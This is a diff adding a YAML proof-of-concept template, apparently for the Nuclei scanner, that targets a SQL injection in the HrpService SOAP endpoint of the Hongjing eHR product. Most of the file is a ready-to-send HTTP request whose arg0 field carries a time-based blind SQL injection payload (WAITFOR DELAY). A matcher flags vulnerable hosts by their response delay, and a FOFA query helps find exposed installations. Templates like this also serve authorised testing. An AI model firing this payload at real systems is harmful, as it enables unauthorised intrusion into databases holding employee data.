@@ -1,0 +1,22 @@
+id: poc-bxrmb20uyo6l4did
+info:
+  name: 宏景eHR HrpService存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bxrmb20uyo6l4did
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bxrmb20uyo6l4did
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - "POST /services/HrpService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: application/xml\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:hr=\"http://www.hjsj.com/HrpService\">\n<soapenv:Header/>\n   <soapenv:Body>\n      <hr:processResult>\n         <arg0>1);WAITFOR DELAY '0:0:5'--</arg0>\n         <arg1></arg1>\n      </hr:processResult>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
